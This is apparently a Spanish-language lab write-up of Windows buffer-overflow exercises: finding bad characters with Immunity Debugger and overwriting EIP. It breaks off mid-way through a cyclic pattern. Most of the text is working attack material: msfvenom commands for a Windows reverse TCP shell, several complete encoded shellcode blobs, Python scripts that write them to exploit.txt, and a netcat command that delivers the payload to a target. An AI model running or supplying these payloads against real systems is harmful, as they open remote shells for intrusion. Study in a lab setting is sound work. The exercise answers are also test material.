```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f c -b "\x00\0a\x1a\x2f\x95\xa7"
```

Que desarrollará el siguiente output:

```
> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.127.132  LPORT=4444 -f py -v shellcode -b "\x00\x0a\x1a\x2f\x95\xa7"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1965 bytes
shellcode =  b""
shellcode += b"\xdb\xce\xd9\x74\x24\xf4\xbe\x45\xec\xf4\xb0"
shellcode += b"\x5d\x31\xc9\xb1\x52\x31\x75\x17\x83\xc5\x04"
shellcode += b"\x03\x30\xff\x16\x45\x46\x17\x54\xa6\xb6\xe8"
shellcode += b"\x39\x2e\x53\xd9\x79\x54\x10\x4a\x4a\x1e\x74"
shellcode += b"\x67\x21\x72\x6c\xfc\x47\x5b\x83\xb5\xe2\xbd"
shellcode += b"\xaa\x46\x5e\xfd\xad\xc4\x9d\xd2\x0d\xf4\x6d"
shellcode += b"\x27\x4c\x31\x93\xca\x1c\xea\xdf\x79\xb0\x9f"
shellcode += b"\xaa\x41\x3b\xd3\x3b\xc2\xd8\xa4\x3a\xe3\x4f"
shellcode += b"\xbe\x64\x23\x6e\x13\x1d\x6a\x68\x70\x18\x24"
shellcode += b"\x03\x42\xd6\xb7\xc5\x9a\x17\x1b\x28\x13\xea"
shellcode += b"\x65\x6d\x94\x15\x10\x87\xe6\xa8\x23\x5c\x94"
shellcode += b"\x76\xa1\x46\x3e\xfc\x11\xa2\xbe\xd1\xc4\x21"
shellcode += b"\xcc\x9e\x83\x6d\xd1\x21\x47\x06\xed\xaa\x66"
shellcode += b"\xc8\x67\xe8\x4c\xcc\x2c\xaa\xed\x55\x89\x1d"
shellcode += b"\x11\x85\x72\xc1\xb7\xce\x9f\x16\xca\x8d\xf7"
shellcode += b"\xdb\xe7\x2d\x08\x74\x7f\x5e\x3a\xdb\x2b\xc8"
shellcode += b"\x76\x94\xf5\x0f\x78\x8f\x42\x9f\x87\x30\xb3"
shellcode += b"\xb6\x43\x64\xe3\xa0\x62\x05\x68\x30\x8a\xd0"
shellcode += b"\x3f\x60\x24\x8b\xff\xd0\x84\x7b\x68\x3a\x0b"
shellcode += b"\xa3\x88\x45\xc1\xcc\x23\xbc\x82\x32\x1b\xc1"
shellcode += b"\xd6\xdb\x5e\x3d\xc6\x47\xd6\xdb\x82\x67\xbe"
shellcode += b"\x74\x3b\x11\x9b\x0e\xda\xde\x31\x6b\xdc\x55"
shellcode += b"\xb6\x8c\x93\x9d\xb3\x9e\x44\x6e\x8e\xfc\xc3"
shellcode += b"\x71\x24\x68\x8f\xe0\xa3\x68\xc6\x18\x7c\x3f"
shellcode += b"\x8f\xef\x75\xd5\x3d\x49\x2c\xcb\xbf\x0f\x17"
shellcode += b"\x4f\x64\xec\x96\x4e\xe9\x48\xbd\x40\x37\x50"
shellcode += b"\xf9\x34\xe7\x07\x57\xe2\x41\xfe\x19\x5c\x18"
shellcode += b"\xad\xf3\x08\xdd\x9d\xc3\x4e\xe2\xcb\xb5\xae"
shellcode += b"\x53\xa2\x83\xd1\x5c\x22\x04\xaa\x80\xd2\xeb"
shellcode += b"\x61\x01\xe2\xa1\x2b\x20\x6b\x6c\xbe\x70\xf6"
shellcode += b"\x8f\x15\xb6\x0f\x0c\x9f\x47\xf4\x0c\xea\x42"
shellcode += b"\xb0\x8a\x07\x3f\xa9\x7e\x27\xec\xca\xaa"
```

De esta forma, el output del comando anterior lo incorporamos en el siguiente script de python:

```
#!/usr/bin/python

shellcode =  b""
shellcode += b"\xbb\xb7\x28\x5c\x3e\xd9\xcc\xd9\x74\x24\xf4"
shellcode += b"\x58\x31\xc9\xb1\x52\x83\xe8\xfc\x31\x58\x0e"
shellcode += b"\x03\xef\x26\xbe\xcb\xf3\xdf\xbc\x34\x0b\x20"
shellcode += b"\xa1\xbd\xee\x11\xe1\xda\x7b\x01\xd1\xa9\x29"
shellcode += b"\xae\x9a\xfc\xd9\x25\xee\x28\xee\x8e\x45\x0f"
shellcode += b"\xc1\x0f\xf5\x73\x40\x8c\x04\xa0\xa2\xad\xc6"
shellcode += b"\xb5\xa3\xea\x3b\x37\xf1\xa3\x30\xea\xe5\xc0"
shellcode += b"\x0d\x37\x8e\x9b\x80\x3f\x73\x6b\xa2\x6e\x22"
shellcode += b"\xe7\xfd\xb0\xc5\x24\x76\xf9\xdd\x29\xb3\xb3"
shellcode += b"\x56\x99\x4f\x42\xbe\xd3\xb0\xe9\xff\xdb\x42"
shellcode += b"\xf3\x38\xdb\xbc\x86\x30\x1f\x40\x91\x87\x5d"
shellcode += b"\x9e\x14\x13\xc5\x55\x8e\xff\xf7\xba\x49\x74"
shellcode += b"\xfb\x77\x1d\xd2\x18\x89\xf2\x69\x24\x02\xf5"
shellcode += b"\xbd\xac\x50\xd2\x19\xf4\x03\x7b\x38\x50\xe5"
shellcode += b"\x84\x5a\x3b\x5a\x21\x11\xd6\x8f\x58\x78\xbf"
shellcode += b"\x7c\x51\x82\x3f\xeb\xe2\xf1\x0d\xb4\x58\x9d"
shellcode += b"\x3d\x3d\x47\x5a\x41\x14\x3f\xf4\xbc\x97\x40"
shellcode += b"\xdd\x7a\xc3\x10\x75\xaa\x6c\xfb\x85\x53\xb9"
shellcode += b"\xac\xd5\xfb\x12\x0d\x85\xbb\xc2\xe5\xcf\x33"
shellcode += b"\x3c\x15\xf0\x99\x55\xbc\x0b\x4a\x9a\xe9\x3e"
shellcode += b"\x35\x72\xe8\x40\x58\xdf\x65\xa6\x30\xcf\x23"
shellcode += b"\x71\xad\x76\x6e\x09\x4c\x76\xa4\x74\x4e\xfc"
shellcode += b"\x4b\x89\x01\xf5\x26\x99\xf6\xf5\x7c\xc3\x51"
shellcode += b"\x09\xab\x6b\x3d\x98\x30\x6b\x48\x81\xee\x3c"
shellcode += b"\x1d\x77\xe7\xa8\xb3\x2e\x51\xce\x49\xb6\x9a"
shellcode += b"\x4a\x96\x0b\x24\x53\x5b\x37\x02\x43\xa5\xb8"
shellcode += b"\x0e\x37\x79\xef\xd8\xe1\x3f\x59\xab\x5b\x96"
shellcode += b"\x36\x65\x0b\x6f\x75\xb6\x4d\x70\x50\x40\xb1"
shellcode += b"\xc1\x0d\x15\xce\xee\xd9\x91\xb7\x12\x7a\x5d"
shellcode += b"\x62\x97\x8a\x14\x2e\xbe\x02\xf1\xbb\x82\x4e"
shellcode += b"\x02\x16\xc0\x76\x81\x92\xb9\x8c\x99\xd7\xbc"
shellcode += b"\xc9\x1d\x04\xcd\x42\xc8\x2a\x62\x62\xd9"

f = open("exploit.txt", "wb")
f.write(shellcode)
f.close()
```

Ejecutamos el script  y seguidamente activamos un listener de netcat de acuerdo con el puerto del payload y empleamos el siguiente comando:

```
cat exploit.txt - | nc <IP> 4444
```

Esto nos abrirá una shell que nos permitirá acceder al sistema y conseguir la flag.

<br />

**4.  De manera similar al ejercicio del tema de la primera sección, el programa _bad-characters-2_ también toma shellcode como entrada, pero es un poco más quisquilloso; el binario parece estar eliminando algunos caracteres específicos del búfer almacenado antes de ejecutar CALL EBX que ejecuta su carga útil. Para ayudar con las pruebas y la práctica en su cliente de Windows, puede descargar bad-characters-windows-2.exe desde el servidor web VM #2 en el puerto 80. Una vez que esté listo, conéctese al puerto 4444 de la VM #2 a través de netcat y obtenga un shell mediante el envío de código de shell generado por msfvenom de shell inverso de 32 bits sin formato que no contiene los caracteres incorrectos especificados. Luego lea flag.txt para obtener la bandera. NOTA: se debe usar la siguiente sintaxis al probar el exploit contra la máquina virtual de destino: `cat exploit.txt - | nc <target IP> 4444`.**

De la misma forma en la que hemos procedido en el caso anterior, escribimos todos los bytes hexadecimales en orden en un fichero haciendo uso del siguiente script de python:

```
#!/usr/bin/python

badchars = b""
badchars += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
badchars += b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
badchars += b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
badchars += b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
badchars += b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
badchars += b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
badchars += b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
badchars += b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
badchars += b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
badchars += b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
badchars += b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
badchars += b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
badchars += b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
badchars += b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
badchars += b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
badchars += b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

f = open("exploit.txt", "wb")
f.write(badchars)
f.close()
```

Así, llevamos de nuevo el fichero 'exploit.txt' sobre el escritorio de Windows y vinculamos el bianrio con Immunity Debugger. Ejecutamos y acudimos al registro EBX para comprobar los badchars. Así, excluimos: \\x00\\x0a\\x1a\\x39\\x85\\xeb.

Así, montamos el shell code con el siguiente comando de msfvenom:

```
> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.200 LPORT=4444 -f py -v shellcode -b "\x00\x0a\x1a\x39\x85\xeb" 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1965 bytes
shellcode =  b""
shellcode += b"\xdb\xd0\xb8\xd5\xba\xe6\x5e\xd9\x74\x24\xf4"
shellcode += b"\x5f\x31\xc9\xb1\x52\x83\xc7\x04\x31\x47\x13"
shellcode += b"\x03\x92\xa9\x04\xab\xe0\x26\x4a\x54\x18\xb7"
shellcode += b"\x2b\xdc\xfd\x86\x6b\xba\x76\xb8\x5b\xc8\xda"
shellcode += b"\x35\x17\x9c\xce\xce\x55\x09\xe1\x67\xd3\x6f"
shellcode += b"\xcc\x78\x48\x53\x4f\xfb\x93\x80\xaf\xc2\x5b"
shellcode += b"\xd5\xae\x03\x81\x14\xe2\xdc\xcd\x8b\x12\x68"
shellcode += b"\x9b\x17\x99\x22\x0d\x10\x7e\xf2\x2c\x31\xd1"
shellcode += b"\x88\x76\x91\xd0\x5d\x03\x98\xca\x82\x2e\x52"
shellcode += b"\x61\x70\xc4\x65\xa3\x48\x25\xc9\x8a\x64\xd4"
shellcode += b"\x13\xcb\x43\x07\x66\x25\xb0\xba\x71\xf2\xca"
shellcode += b"\x60\xf7\xe0\x6d\xe2\xaf\xcc\x8c\x27\x29\x87"
shellcode += b"\x83\x8c\x3d\xcf\x87\x13\x91\x64\xb3\x98\x14"
shellcode += b"\xaa\x35\xda\x32\x6e\x1d\xb8\x5b\x37\xfb\x6f"
shellcode += b"\x63\x27\xa4\xd0\xc1\x2c\x49\x04\x78\x6f\x06"
shellcode += b"\xe9\xb1\x8f\xd6\x65\xc1\xfc\xe4\x2a\x79\x6a"
shellcode += b"\x45\xa2\xa7\x6d\xaa\x99\x10\xe1\x55\x22\x61"
shellcode += b"\x28\x92\x76\x31\x42\x33\xf7\xda\x92\xbc\x22"
shellcode += b"\x4c\xc2\x12\x9d\x2d\xb2\xd2\x4d\xc6\xd8\xdc"
shellcode += b"\xb2\xf6\xe3\x36\xdb\x9d\x1e\xd1\x24\xc9\x0d"
shellcode += b"\xe9\xcd\x08\x4d\xf8\x51\x84\xab\x90\x79\xc0"
shellcode += b"\x64\x0d\xe3\x49\xfe\xac\xec\x47\x7b\xee\x67"
shellcode += b"\x64\x7c\xa1\x8f\x01\x6e\x56\x60\x5c\xcc\xf1"
shellcode += b"\x7f\x4a\x78\x9d\x12\x11\x78\xe8\x0e\x8e\x2f"
shellcode += b"\xbd\xe1\xc7\xa5\x53\x5b\x7e\xdb\xa9\x3d\xb9"
shellcode += b"\x5f\x76\xfe\x44\x5e\xfb\xba\x62\x70\xc5\x43"
shellcode += b"\x2f\x24\x99\x15\xf9\x92\x5f\xcc\x4b\x4c\x36"
shellcode += b"\xa3\x05\x18\xcf\x8f\x95\x5e\xd0\xc5\x63\xbe"
shellcode += b"\x61\xb0\x35\xc1\x4e\x54\xb2\xba\xb2\xc4\x3d"
shellcode += b"\x11\x77\xf4\x77\x3b\xde\x9d\xd1\xae\x62\xc0"
shellcode += b"\xe1\x05\xa0\xfd\x61\xaf\x59\xfa\x7a\xda\x5c"
shellcode += b"\x46\x3d\x37\x2d\xd7\xa8\x37\x82\xd8\xf8"

```



<br />

**5.  De manera similar al ejercicio del tema de la primera sección, el programa bad-characters-3 también toma shellcode como entrada, pero es un poco más quisquilloso; el binario parece estar eliminando algunos caracteres específicos del búfer almacenado antes de ejecutar CALL EBX que ejecuta su carga útil. Para ayudar con las pruebas y la práctica en su cliente de Windows, puede descargar bad-characters-windows-3.exe desde el servidor web VM #3 en el puerto 80. Una vez que esté listo, conéctese al puerto 4444 de la VM #3 a través de netcat y obtenga un shell mediante el envío de un shellcode de shell inverso generado por msfvenom de 32 bits sin formato que no contiene los caracteres incorrectos especificados. Luego lea flag.txt para obtener la bandera.

De manera similar a como hemos procedido anteriormente, primero testeamos los badchars pasándo un fichero exploit.txt que tenga todos los caracters hexadecimales ordenados y buscando malos caracteres sobre el registro EBX y seguidamente haciendo con MSFVenom un shellcode sin los caracteres malos.

Obtenemos que los badchars en este caso son: \\x00\\x0a\\x0f\\x1a\\x5f\\xcd

El shell code es por tanto:

```
> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.200 LPORT=4444 -f py -v shellcode -b "\x00\x0a\x0f\x1a\x5f\xcd" 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of py file: 1953 bytes
shellcode =  b""
shellcode += b"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x38\x71\x42\xb9\x83\xee\xfc"
shellcode += b"\xe2\xf4\xc4\x99\xc0\xb9\x38\x71\x22\x30\xdd"
shellcode += b"\x40\x82\xdd\xb3\x21\x72\x32\x6a\x7d\xc9\xeb"
shellcode += b"\x2c\xfa\x30\x91\x37\xc6\x08\x9f\x09\x8e\xee"
shellcode += b"\x85\x59\x0d\x40\x95\x18\xb0\x8d\xb4\x39\xb6"
shellcode += b"\xa0\x4b\x6a\x26\xc9\xeb\x28\xfa\x08\x85\xb3"
shellcode += b"\x3d\x53\xc1\xdb\x39\x43\x68\x69\xfa\x1b\x99"
shellcode += b"\x39\xa2\xc9\xf0\x20\x92\x78\xf0\xb3\x45\xc9"
shellcode += b"\xb8\xee\x40\xbd\x15\xf9\xbe\x4f\xb8\xff\x49"
shellcode += b"\xa2\xcc\xce\x72\x3f\x41\x03\x0c\x66\xcc\xdc"
shellcode += b"\x29\xc9\xe1\x1c\x70\x91\xdf\xb3\x7d\x09\x32"
shellcode += b"\x60\x6d\x43\x6a\xb3\x75\xc9\xb8\xe8\xf8\x06"
shellcode += b"\x9d\x1c\x2a\x19\xd8\x61\x2b\x13\x46\xd8\x2e"
shellcode += b"\x1d\xe3\xb3\x63\xa9\x34\x65\x19\x71\x8b\x38"
shellcode += b"\x71\x2a\xce\x4b\x43\x1d\xed\x50\x3d\x35\x9f"
shellcode += b"\x3f\x8e\x97\x01\xa8\x70\x42\xb9\x11\xb5\x16"
shellcode += b"\xe9\x50\x58\xc2\xd2\x38\x8e\x97\xe9\x68\x21"
shellcode += b"\x12\xf9\x68\x31\x12\xd1\xd2\x7e\x9d\x59\xc7"
shellcode += b"\xa4\xd5\xd3\x3d\x19\x82\x11\x15\xb9\x2a\xbb"
shellcode += b"\x38\x60\x1e\x30\xde\x1b\x52\xef\x6f\x19\xdb"
shellcode += b"\x1c\x4c\x10\xbd\x6c\xbd\xb1\x36\xb5\xc7\x3f"
shellcode += b"\x4a\xcc\xd4\x19\xb2\x0c\x9a\x27\xbd\x6c\x50"
shellcode += b"\x12\x2f\xdd\x38\xf8\xa1\xee\x6f\x26\x73\x4f"
shellcode += b"\x52\x63\x1b\xef\xda\x8c\x24\x7e\x7c\x55\x7e"
shellcode += b"\xb8\x39\xfc\x06\x9d\x28\xb7\x42\xfd\x6c\x21"
shellcode += b"\x14\xef\x6e\x37\x14\xf7\x6e\x27\x11\xef\x50"
shellcode += b"\x08\x8e\x86\xbe\x8e\x97\x30\xd8\x3f\x14\xff"
shellcode += b"\xc7\x41\x2a\xb1\xbf\x6c\x22\x46\xed\xca\xb2"
shellcode += b"\x0c\x9a\x27\x2a\x1f\xad\xcc\xdf\x46\xed\x4d"
shellcode += b"\x44\xc5\x32\xf1\xb9\x59\x4d\x74\xf9\xfe\x2b"
shellcode += b"\x03\x2d\xd3\x38\x22\xbd\x6c"
```

**6.  De manera similar al ejercicio del tema de la primera sección, el programa bad-characters-4 también toma shellcode como entrada, pero es un poco más quisquilloso; el binario parece estar eliminando algunos caracteres específicos del búfer almacenado antes de ejecutar CALL EBX que ejecuta su carga útil. Para ayudar con las pruebas y la práctica en su cliente de Windows, puede descargar bad-characters-windows-4.exe desde el servidor web VM #4 en el puerto 80. Una vez que esté listo, conéctese al puerto 4444 de la VM #4 a través de netcat y obtenga un shell mediante el envío de código de shell generado por msfvenom de shell inverso de 32 bits sin formato que no contiene los caracteres incorrectos especificados. Luego lea flag.txt para obtener la bandera.**

Badchars: \\x00\\x06\\x0a\\x1a\\x3b\\xcf

Shellcode:

```
> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.200 LPORT=4444 -f py -v shellcode -b "\x00\x06\x0a\x1a\x3b\xcf"      
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of py file: 1965 bytes
shellcode =  b""
shellcode += b"\xdb\xcc\xba\x33\xa6\xec\x11\xd9\x74\x24\xf4"
shellcode += b"\x5e\x29\xc9\xb1\x52\x83\xee\xfc\x31\x56\x13"
shellcode += b"\x03\x65\xb5\x0e\xe4\x75\x51\x4c\x07\x85\xa2"
shellcode += b"\x31\x81\x60\x93\x71\xf5\xe1\x84\x41\x7d\xa7"
shellcode += b"\x28\x29\xd3\x53\xba\x5f\xfc\x54\x0b\xd5\xda"
shellcode += b"\x5b\x8c\x46\x1e\xfa\x0e\x95\x73\xdc\x2f\x56"
shellcode += b"\x86\x1d\x77\x8b\x6b\x4f\x20\xc7\xde\x7f\x45"
shellcode += b"\x9d\xe2\xf4\x15\x33\x63\xe9\xee\x32\x42\xbc"
shellcode += b"\x65\x6d\x44\x3f\xa9\x05\xcd\x27\xae\x20\x87"
shellcode += b"\xdc\x04\xde\x16\x34\x55\x1f\xb4\x79\x59\xd2"
shellcode += b"\xc4\xbe\x5e\x0d\xb3\xb6\x9c\xb0\xc4\x0d\xde"
shellcode += b"\x6e\x40\x95\x78\xe4\xf2\x71\x78\x29\x64\xf2"
shellcode += b"\x76\x86\xe2\x5c\x9b\x19\x26\xd7\xa7\x92\xc9"
shellcode += b"\x37\x2e\xe0\xed\x93\x6a\xb2\x8c\x82\xd6\x15"
shellcode += b"\xb0\xd4\xb8\xca\x14\x9f\x55\x1e\x25\xc2\x31"
shellcode += b"\xd3\x04\xfc\xc1\x7b\x1e\x8f\xf3\x24\xb4\x07"
shellcode += b"\xb8\xad\x12\xd0\xbf\x87\xe3\x4e\x3e\x28\x14"
shellcode += b"\x47\x85\x7c\x44\xff\x2c\xfd\x0f\xff\xd1\x28"
shellcode += b"\x9f\xaf\x7d\x83\x60\x1f\x3e\x73\x09\x75\xb1"
shellcode += b"\xac\x29\x76\x1b\xc5\xc0\x8d\xcc\x2a\xbc\xa0"
shellcode += b"\xc4\xc3\xbf\xba\xc5\x4f\x49\x5c\x8f\x7f\x1f"
shellcode += b"\xf7\x38\x19\x3a\x83\xd9\xe6\x90\xee\xda\x6d"
shellcode += b"\x17\x0f\x94\x85\x52\x03\x41\x66\x29\x79\xc4"
shellcode += b"\x79\x87\x15\x8a\xe8\x4c\xe5\xc5\x10\xdb\xb2"
shellcode += b"\x82\xe7\x12\x56\x3f\x51\x8d\x44\xc2\x07\xf6"
shellcode += b"\xcc\x19\xf4\xf9\xcd\xec\x40\xde\xdd\x28\x48"
shellcode += b"\x5a\x89\xe4\x1f\x34\x67\x43\xf6\xf6\xd1\x1d"
shellcode += b"\xa5\x50\xb5\xd8\x85\x62\xc3\xe4\xc3\x14\x2b"
shellcode += b"\x54\xba\x60\x54\x59\x2a\x65\x2d\x87\xca\x8a"
shellcode += b"\xe4\x03\xfa\xc0\xa4\x22\x93\x8c\x3d\x77\xfe"
shellcode += b"\x2e\xe8\xb4\x07\xad\x18\x45\xfc\xad\x69\x40"
shellcode += b"\xb8\x69\x82\x38\xd1\x1f\xa4\xef\xd2\x35"
```

<br />

##### 2.3.2. Finding a return address.

**3. Para resolver este desafío, debe acceder a la función flag() dentro de execution-flow-windows.exe que está disponible en el sitio web de destino VM #1 en http://\[VM#1_IP]/execution-flow-windows.exe. Esta función lee datos de exploit.txt y copia estos datos en un búfer que es vulnerable a un desbordamiento de búfer. Como puede ver en la ejecución-flujo-windows.c.txt del mismo servidor web, la función flag() nunca se llama y, por lo tanto, nunca se ejecutará. Use el desbordamiento del búfer para controlar el valor de retorno de vuln() para mostrar la bandera y resolver este desafío conectándose.**

En primer lugar descargamos el binario y lo transportamos sobre nuestro cliente de Windows10. Una vez ahí, lo ejecutamos a través de la CMD.

```
C:\Users\aeoae\Desktop>.\execution-flow-windows.exe
*******************************************************************************
********************* Welcome to Execution Flow: Windows **********************
*******************************************************************************

Utilize the BOF to jump directly to flag() to display the flag.

Reading in contents of 'exploit.txt' in the local directory.

Error: 'exploit.txt' missing. Exiting program.
If you want to read from STDIN (the command line) instead, run with:
./{{program_name}} server
```

Recibimos un mensaje de que lee y almacena el contenido de un fichero 'exploit.txt' y que debemos obtener la flag de algún lugar del Buffer que el programa no carga. Debemos hacerlo explotando una BOF vulnerability.

En primera instancia, deberíamos manipular el EIP que es un registro al que el procesador acude en busca de la siguiente instrucción a ejecutar, es decir, este es un registro sobre el que recae el control del flujo de ejecución del programa. 

Así pues, veamos si podemos llegar a introducir un input lo suficientemente grande como para sobrescribir el EIP. Utilizamos el siguiente sctipt en python:

```
#!/usr/bin/python

badchars = b"A" * 2000

f = open("exploit.txt", "wb")
f.write(badchars)
f.close()
```

Para generar un fichero con 'A's hexadecimales que posteriormente pasaremos como input al programa. De esta forma, vinculamos el programa con Immunity Debugger y con nuestro nuevo fichero 'exploit.txt' en el escritorio lo ejecutamos obteniendo que hemos sobreescrito satisfactoriamente el EIP con un input de al menos 2000 bytes. Para tener la localización exacta del EIP empleamos una cadena de caracteres que no se repiten generada por la herramienta del kit de metasploit:

```
> msf-pattern_create -l 2000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3C